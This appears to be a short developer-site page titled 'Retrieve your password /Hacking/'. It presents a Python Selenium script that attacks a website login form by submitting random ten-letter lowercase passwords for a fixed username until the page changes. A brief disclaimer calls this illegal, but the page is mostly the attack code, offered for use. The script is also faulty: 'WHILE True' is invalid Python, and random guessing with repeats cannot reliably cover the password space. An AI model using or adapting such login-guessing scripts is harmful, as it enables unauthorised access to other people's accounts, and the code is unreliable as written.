---
title: 'Retrieve your password /Hacking/'
description: "Imagine that you have lost an essential password but you can't change it"
category: Dev
position: 1
---

## Explanation
Imagine that you cannot retrieve your password because you have no longer access to your email. 
You can contact the website but that is too simple. 

You can bruteforce if your password is not long.

(This is illegal, don't to this, educationnal purpose only)

## The code
<code-group>
  <code-block label="main.py" active>

  ```python
import random
import string
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument("--window-size=1920,1080")
driver = webdriver.Chrome(options=chrome_options)
DAURL = "https://www.THEWEBSITETOLOG.com/login"
driver.get(DAURL)
WHILE True :
    randompassword = ''.join(random.choice(string.ascii_lowercase) for i in range(10))  ##THIS WILL GENERATE 10 caracters long password with ONLY letters
    username = driver.find_element_by_id("username")
    password = driver.find_element_by_id("password")
    username.send_keys("My USERNAME")
    password.send_keys(randompassword)
    driver.find_element_by_id("submit_btn").click()
    if DAURL != driver.current_url: 
        print("The password is found")
        print(randompassword)
        ##You can send you an email, call your api to know the password
        break
driver.close()
  ```

  </code-block>
  </code-group>